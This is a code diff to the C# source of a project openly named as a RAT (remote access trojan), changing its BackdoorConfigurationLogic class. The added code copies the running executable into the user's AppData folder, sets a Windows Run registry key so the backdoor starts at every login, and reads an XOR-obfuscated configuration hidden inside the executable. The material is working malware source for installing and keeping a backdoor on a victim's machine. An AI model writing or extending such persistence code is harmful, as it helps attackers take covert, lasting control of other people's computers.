@@ -1,5 +1,7 @@
-﻿using Newtonsoft.Json;
+﻿using Microsoft.Win32;
+using Newtonsoft.Json;
 using RAT.Configuration;
+using RAT.Interfaces;
 using System;
 using System.IO;
 using System.Text;
@@ -9,22 +11,79 @@ namespace RAT.Configurations
     /// <summary>
     /// Contains logic to work with backdoor configuration.
     /// </summary>
-    public class BackdoorConfigurationLogic
+    public class BackdoorConfigurationLogic : IBackdoorConfigurationLogic
     {
+        /// <summary>
+        /// This section is needed to get our exe location for self-contained exe. Which by default is launched from .NET dll.
+        /// </summary>
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+        private static extern uint GetModuleFileName(IntPtr hModule, StringBuilder lpFilename, int nSize);
+
+        /// <summary>
+        /// Configures our RAT.
+        /// Set's up registry key for self-startup, copies exe to other location, and returns JSON configuration from exe.
+        /// </summary>
+        /// <returns>Backdoor configuration.</returns>
+        public BackdoorConfiguration Configure()
+        {
+            string pathToExe = this.CopyExeToOtherLocation(); // 1 Step - copy exe to AppData.
+            this.SetRegistryKeyForApplication(pathToExe); // 2 Step - set registry key.
+            return GetBackdoorConfiguration(); // 3 Step - get configuration which is merged into our .exe
+        }
+
+        /// <summary>
+        /// Copies exe to AppData directory and creates there folder for our exe.
+        /// </summary>
+        /// <returns>Exex path to our rat in AppData where exe was copied to.</returns>
+        private string CopyExeToOtherLocation()
+        {
+            var pathToAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            var pathToRatInAppData = pathToAppData + "\\RAT"; // Our folder
+            var pathToExeInAppData = pathToRatInAppData + "\\RAT.exe"; // Our exe in folder
+            if (!Directory.Exists(pathToRatInAppData))
+            {
+                Directory.CreateDirectory(pathToRatInAppData);
+            }
+
+            if (!File.Exists(pathToExeInAppData))
+            {
+                var ourExeLocation = this.GetExecutablePath();
+                File.Copy(ourExeLocation, pathToExeInAppData);
+            }
+
+            return pathToExeInAppData;
+        }
+
+        /// <summary>
+        /// Set's registry key for application self startup.
+        /// </summary>
+        /// <param name="pathToExe">Path to where exe is located, which should be autolaunched.</param>
+        private void SetRegistryKeyForApplication(string pathToExe)
+        {
+            string entryName = "RAT";
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
+            {
+                if (key == null || key.GetValue(entryName) == null)
+                {
+                    key.SetValue(entryName, pathToExe);
+                }
+            }
+        }
+
         /// <summary>
         /// Retrieves configuration from JSON file which is merged in our exe process.
         /// </summary>
         /// <returns>Class that represents file configuration.</returns>
-        public BackdoorConfiguration GetBackdoorConfiguration()
+        private BackdoorConfiguration GetBackdoorConfiguration()
         {
             // NOTE:
             // THIS IS CONFIGURED ALSO IN OUR EXTERNAL TOOL, WHICH MERGES CONFIGURATION TO .EXE
             // IF ANYTHING IS CHANGED HERE, THEN IT SHOULD BE CHANGED AS WELL IN TOOL AND VICE-VERSA!
             // ----
-            const byte firstKey = 60; // Out first key for xor encryption
-            const byte secondKey = 70; // Out second key for xor encryption
-            const string configurationStartSignature = "RATR8GDKddFkFMEidhhxHzHRAT"; // Our configuration position start identifier in exe
-            const string configurationEndSignature = "58cERyKedv"; // Our configuration position end identifier in exe
+            byte firstKey = 60; // Out first key for xor encryption
+            byte secondKey = 70; // Out second key for xor encryption
+            string configurationStartSignature = "RATR8GDKddFkFMEidhhxHzHRAT"; // Our configuration position start identifier in exe
+            string configurationEndSignature = "58cERyKedv"; // Our configuration position end identifier in exe
             // ----
 
             string pathToOurExe = GetExecutablePath();
@@ -56,6 +115,18 @@ namespace RAT.Configurations
 
             string decryptedConfiguration = DecryptConfigurationToString(encryptedConfiguration, firstKey, secondKey);
             return ToJson(decryptedConfiguration);
+        }
+
+        /// <summary>
+        /// Get's .exe path from self-contained application.
+        /// </summary>
+        /// <returns>Full path to exe.</returns>
+        private string GetExecutablePath()
+        {
+            int maxPath = 255;
+            var builder = new StringBuilder(maxPath);
+            GetModuleFileName(IntPtr.Zero, builder, maxPath);
+            return builder.ToString();
         }
 
         /// <summary>
@@ -160,24 +231,6 @@ namespace RAT.Configurations
             }
 
             return false;
-        }
-
-        /// <summary>
-        /// This section is needed to get our exe location for self-contained exe. Which by default is launched from .NET dll.
-        /// </summary>
-        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
-        private static extern uint GetModuleFileName(IntPtr hModule, StringBuilder lpFilename, int nSize);
-
-        /// <summary>
-        /// Get's .exe path from self-contained application.
-        /// </summary>
-        /// <returns>Full path to exe.</returns>
-        private string GetExecutablePath()
-        {
-            int maxPath = 255;
-            var builder = new StringBuilder(maxPath);
-            GetModuleFileName(IntPtr.Zero, builder, maxPath);
-            return builder.ToString();
         }
     }
 }
